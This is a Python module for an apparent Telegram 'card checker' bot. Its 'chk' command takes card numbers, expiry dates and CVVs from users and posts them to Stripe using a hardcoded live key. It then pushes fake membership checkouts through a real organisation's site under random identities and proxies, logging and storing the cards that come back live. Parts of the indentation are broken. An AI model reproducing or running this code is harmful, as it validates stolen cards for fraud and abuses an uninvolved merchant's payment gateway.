import time
import requests
import os
from requests.exceptions import ProxyError

from jocasta.modules.filters.checker_defs import save_live
from jocasta.services.antispam_dec import get_spam_dec
from jocasta.services.language import get_strings_dec
from jocasta.services.gate_on_off import gate_info_dec
from jocasta.dec import register
from jocasta.services.red import aioredis
from jocasta.services.mongo import adb
from jocasta.utlis.send_log import send_logs
from jocasta.modules.filters.bin_info import get_bin_info
from jocasta.modules.filters.get_card_details import get_cards
from .func.chk_defs import get_response_chk
from .func.rand_user import random_user_api,PROXIES
from jocasta import CROSS


ck_headers = {
'authority': 'gritsgobang.org',
'method': 'POST',
'path': '/membership-account/membership-checkout/',
'scheme': 'https',
'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6',
'cache-control': 'max-age=0',
'content-length': '585',
'content-type': 'application/x-www-form-urlencoded',
'cookie': 'PHPSESSID=c460c7b79f556e1acc679a3b2309d1a3',
'dnt': '1',
'origin': 'https://gritsgobang.org',
'referer': 'https://gritsgobang.org/membership-account/membership-checkout',
'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="96", "Google Chrome";v="96"',
'sec-ch-ua-mobile': '?0',
'sec-ch-ua-platform': '"Linux"',
'sec-fetch-dest': 'document',
'sec-fetch-mode': 'navigate',
'sec-fetch-site': 'same-origin',
'sec-fetch-user': '?1',
'upgrade-insecure-requests': '1',
'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36',
}


@register(cmds="chk",  is_text=True)
@gate_info_dec('chk')
@get_strings_dec("card_check")
@get_spam_dec()
async def chk(message, gate_info, user_info,start_time, lang):
    try:
        await message.answer_chat_action('typing')
        msg = await message.reply(lang['start_msg'].format(gate_name=gate_info['name'], name=message.from_user.first_name, id=message.from_user.id,role=user_info['role']), disable_web_page_preview=True)
        data = await get_cards(message.reply_to_message.text if message.reply_to_message is not None else message.text,message.from_user.id)
        assert isinstance(data, tuple), data
        cc, mes, ano, cvv = data
        lista = f'{cc}|{mes}|{ano}|{cvv}'
        bin_info = await get_bin_info(cc[:6],message.from_user.id)
        assert bin_info, lang['bin_banned']
        await msg.edit_text(lang['card_msg'].format(card=lista, name=message.from_user.first_name, id=message.from_user.id,
                                    bin_bank=bin_info['bank_name'], gate_name=gate_info['name'],
                                    elapsed=round(time.time() - start_time), bin_country=bin_info['country'],
                                    flag=bin_info['flag'], vendor=bin_info['vendor'], level=bin_info['level'],
                                    type=bin_info['type'], role=user_info['role']), disable_web_page_preview=True)
        browser = requests.Session()
                e_json = {
        'type': 'card',
        'card[number]': cc,
        'card[cvc]': cvv,
        'card[exp_month]': mes,
        'card[exp_year]': ano,
        'pasted_fields': 'number',
        'payment_user_agent': 'stripe.js/246ac94f4; stripe-js-v3/246ac94f4',
        'time_on_page': '71684',
        'key': 'pk_live_smzxChNnoBJEI1fynUVGigct',
        }
        first = browser.post('https://api.stripe.com/v1/payment_methods', data = e_json)
        json_first = first.json()
        if 'error' in json_first:
            messa = json_first['error']['decline_code'].replace('_', ' ').upper() if 'decline_code' in json_first['error'] else json_first['error']['code'].replace('_', ' ').upper()
            await msg.edit_text(lang['error_msg'].format(card=lista, name=message.from_user.first_name, id=message.from_user.id,
                                    bin_bank=bin_info['bank_name'], gate_name=gate_info['name'],
                                    elapsed=round(time.time() - start_time), bin_country=bin_info['country'],
                                    flag=bin_info['flag'], vendor=bin_info['vendor'], level=bin_info['level'],
                                    type=bin_info['type'], role=user_info['role'],r_respo = json_first['error']['message'].title(),r_text=
                                    messa,r_logo = CROSS
                                    ), disable_web_page_preview=True)
            return False
        await msg.edit_text(lang['half_msg'].format(card=lista, name=message.from_user.first_name, id=message.from_user.id,
                                    bin_bank=bin_info['bank_name'], gate_name=gate_info['name'],
                                    elapsed=round(time.time() - start_time), bin_country=bin_info['country'],
                                    flag=bin_info['flag'], vendor=bin_info['vendor'], level=bin_info['level'],
                                    type=bin_info['type'], role=user_info['role']), disable_web_page_preview=True)
        random_user = random_user_api().get_random_user_info()
                data = {
        'level': '1',
        'checkjavascript': '1',
        'other_discount_code': '',
        'username': random_user.username,
        'password': random_user.password,
        'password2': random_user.password,
        'bemail': random_user.email,
        'bconfirmemail': random_user.email,
        'fullname': '',
        'FullName': random_user.name,
        'Address1': random_user.street,
        'Address2': '',
        'City': random_user.city,
        'State': random_user.state,
        'Zipcode': random_user.postcode,
        'autorenew_present': '1',
        'bfirstname': random_user.first_name,
        'blastname': random_user.last_name,
        'baddress1': random_user.street,
        'baddress2': '',
        'bcity': random_user.city,
        'bstate': random_user.state,
        'bzipcode': random_user.postcode,
        'bcountry': 'US',
        'bphone': random_user.phone,
        'CardType': bin_info['vendor'],
        'discount_code': '',
        'tos': '1',
        'submit-checkout': '1',
        'javascriptok': '1',
        'payment_method_id': json_first['id'],
        'AccountNumber': cc,
        'ExpirationMonth': mes,
        'ExpirationYear': ano,
            }
        last = browser.post('https://gritsgobang.org/membership-account/membership-checkout',headers = ck_headers , data=data)
        r_text, r_logo, r_respo = get_response_chk(last.text)
        if 'Auth Live' in r_text:
            await send_logs(f'{lista} ' + gate_info['name'])
            save_live(f'{lista} ' + gate_info['name'])
            if user_info['save-ccs']:
                await adb.users.update_one(
                    {'_id': message.from_user.id},
                    {'$addToSet': {'cards': f'{lista} ' + gate_info['name']}},
                )
        await msg.edit_text(lang['last_msg'].format(card=lista, name=message.from_user.first_name, id=message.from_user.id,
                                    bin_bank=bin_info['bank_name'], gate_name=gate_info['name'],
                                    elapsed=round(time.time() - start_time), bin_country=bin_info['country'],
                                    flag=bin_info['flag'], vendor=bin_info['vendor'], level=bin_info['level'],
                                    type=bin_info['type'], role=user_info['role'],r_respo = r_respo,r_text=r_text,r_logo = r_logo
                                    ), disable_web_page_preview=True)
        await aioredis.set(f"spam_{message.from_user.id}", time.time())
    except AssertionError as aserr:
        await msg.edit_text(aserr)
    except (ConnectionError, ProxyError): 
        await msg.edit_text(lang['proxy_dead'])
    except Exception as e:
        await send_logs(e)


# elif 'Error' in r_respo:
#             await send_logs("Error in {} Gateway. uploading file....".format(gate_info['name']))
#             gate_error(e, gate_info['name'])
#             if os.path.exists(f'text_files/{gate_info["name"]}.txt'):
#                 await send_logs_doc(f'text_files/{gate_info["name"]}.txt')